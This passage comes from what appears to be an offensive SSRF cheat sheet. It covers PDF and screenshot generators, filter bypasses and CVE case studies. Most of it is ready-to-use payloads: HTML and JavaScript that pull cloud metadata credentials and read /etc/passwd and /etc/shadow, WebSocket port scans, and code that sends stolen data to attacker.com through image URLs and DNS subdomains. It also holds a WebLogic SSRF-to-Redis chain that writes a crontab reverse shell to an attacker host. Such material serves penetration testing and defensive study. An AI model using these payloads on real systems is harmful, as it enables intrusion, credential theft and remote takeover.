# 5. Attacker's JS reads the response (same-origin!)

# Tools:
# - Singularity of Origin (nccgroup/singularity)
# - rbndr.us (simple rebinding service)

# Protection bypasses:
# - 0.0.0.0 resolves to localhost on many systems
# - CNAME to localhost
# - localhost CNAME chains
```

---

## 13. PDF / SCREENSHOT GENERATOR SSRF

Applications that generate PDFs from HTML or take screenshots of URLs are high-value SSRF targets.

### 13.1 wkhtmltopdf

Converts HTML to PDF. Processes `<iframe>`, `<img>`, `<link>`, `<script>` tags — each triggers a server-side fetch.

```html
<!-- Direct SSRF -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600"></iframe>

<!-- Via image tag -->
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Via CSS -->
<link rel="stylesheet" href="http://169.254.169.254/latest/user-data">

<!-- Via @import in style -->
<style>@import url('http://169.254.169.254/latest/meta-data/');</style>

<!-- Via redirect (if direct IP is blocked) -->
<iframe src="http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/"></iframe>

<!-- JavaScript-based (if JS is enabled in wkhtmltopdf) -->
<script>
document.write('<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">');
</script>

<!-- Local file read -->
<iframe src="file:///etc/passwd" width="800" height="600"></iframe>
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

### 13.2 WeasyPrint

Python HTML/CSS to PDF converter. Processes CSS `@import`, `url()`, `<link>`, `<img>`.

```html
<!-- CSS url() function -->
<link rel="attachment" href="file:///etc/passwd">

<!-- @font-face with url() -->
<style>
@font-face {
  font-family: 'exfil';
  src: url('http://169.254.169.254/latest/meta-data/');
}
</style>

<!-- attachment link (WeasyPrint specific — embeds file in PDF) -->
<link rel="attachment" href="file:///etc/shadow">
```

### 13.3 Chrome Headless / Puppeteer

```html
<!-- Standard fetch-based -->
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>

<!-- JavaScript SSRF (Chrome headless has full JS engine) -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(t => {
    document.body.innerText = t;
  });
</script>

<!-- WebSocket for port scanning -->
<script>
var ws = new WebSocket('ws://127.0.0.1:6379');
ws.onerror = function() { document.title = 'closed'; };
ws.onopen = function() { document.title = 'open'; };
</script>

<!-- DNS prefetch for OOB exfil -->
<link rel="dns-prefetch" href="//data.attacker.com">
```

### 13.4 PhantomJS (Legacy but Still Found)

```html
<script>
var page = require('webpage').create();
page.open('http://169.254.169.254/latest/meta-data/', function(status) {
  console.log(page.content);
  phantom.exit();
});
</script>
```

### 13.5 Detection Fingerprints

| Generator | User-Agent Pattern |
|---|---|
| wkhtmltopdf | `wkhtmltopdf`, `wkhtmltoimage` |
| Chrome Headless | `HeadlessChrome` |
| PhantomJS | `PhantomJS` |
| WeasyPrint | `WeasyPrint` |
| Puppeteer | `HeadlessChrome` (same as Chrome Headless) |

### 13.6 Exfiltration When Output Is Not Visible

If the PDF/screenshot doesn't show the fetched content directly:

```html
<!-- Exfiltrate via external request with data in URL -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(t => {
    new Image().src = 'http://attacker.com/exfil?data=' + btoa(t);
  });
</script>

<!-- Exfiltrate via DNS (longer data) -->
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => {
    var encoded = btoa(t).substring(0, 60);
    var img = new Image();
    img.src = 'http://' + encoded + '.attacker.com/';
  });
</script>
```

---

## 14. ADDITIONAL BYPASS TECHNIQUES

### 14.1 Open Redirect Chaining

```
http://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
http://trusted.com/login?next=http://169.254.169.254/latest/meta-data/
```

If SSRF filter allows `trusted.com` and `trusted.com` has an open redirect → bypass.

### 14.2 URL Shorteners

```
# Create short URL pointing to metadata endpoint:
https://bit.ly/XXXXX → http://169.254.169.254/latest/meta-data/

# Filter sees: bit.ly (allowed domain)
# HTTP client follows redirect → internal IP
```

### 14.3 Enclosed Alphanumeric Characters

```
# Unicode enclosed letters that normalize to ASCII:
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ → http://example.com
http://①②⑦.⓪.⓪.① → may resolve to 127.0.0.1

# Fullwidth characters:
http://１２７．０．０．１ (fullwidth digits)
```

### 14.4 CRLF Injection in SSRF

If the URL is used in a raw HTTP request:

```
http://attacker.com/%0D%0AHost:%20169.254.169.254%0D%0A
```

May inject additional headers or split the request to reach internal services.

### 14.5 Protocol Smuggling via HTTPS → HTTP Downgrade

Some libraries follow redirects from HTTPS to HTTP, losing TLS:

```
https://attacker.com/redirect → 302 → http://169.254.169.254/
```

If the filter only allows HTTPS URLs but the client follows HTTP redirects → bypass.

### 14.6 URL Parser Confusion Payloads

```text
# These may bypass host validation:
http://evil.com#@trusted.com/         # Fragment vs authority confusion
http://trusted.com\@evil.com/         # Backslash as path separator
http://trusted.com%00@evil.com/       # Null byte truncation
http://evil.com%23@trusted.com/       # URL-encoded fragment
http://[::ffff:7f00:1]/              # IPv6-mapped IPv4 localhost
http://0x7f.0x00.0x00.0x01/          # Hex octets
http://0177.0.0.1/                   # Octal
```

---

## 15. CVE CASE STUDIES

### 15.1 WebLogic SSRF (CVE-2014-4210)

WebLogic's UDDI Explorer component exposes SSRF via the `operator` parameter:

```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7001&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

**Exploitation chain — SSRF → Redis → RCE**:

```bash
# Step 1: Port scan internal network via SSRF
# Open port: fast response / "could not connect" error
# Closed port: timeout / different error

# Step 2: Hit internal Redis (6379) via SSRF with crafted payload
operator=http://INTERNAL_REDIS_IP:6379/test%0D%0A%0D%0Aset%201%20%22%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER%2F4444%200%3E%261%0A%0A%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A

# URL-decoded: sends Redis commands via CRLF injection in HTTP request
# Writes crontab reverse shell
```

### 15.2 Kubernetes SSRF (CVE-2020-8555 / CVE-2020-8562)

**CVE-2020-8555**: Kubernetes kube-controller-manager's volume handling allows SSRF when creating StorageClass with `glusterfs` or `quobyte` provisioners. The controller makes HTTP requests to attacker-controlled endpoints.

**CVE-2020-8562** (bypass of the fix): The fix blocked direct internal IP access but could be bypassed via DNS rebinding — attacker's DNS resolves to external IP during validation, then to internal IP during actual request.

---

## 16. THE SSRF-FILTER MINDSET

From zseano's methodology: **if developers filter only `169.254.169.254` directly but not `http://169.254.169.254/latest/meta-data`** (full path), or forget about:
- IPv6 equivalents
- DNS names that resolve to internal IPs
- Redirect chains (server follows 302 to internal IP)

**Classic gap**: App filters `127.0.0.1` but not `127.1` or `[::1]` or `localhost`.

**Application-layer SSRF via XML** (when app parses XML):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<request>&xxe;</request>
```
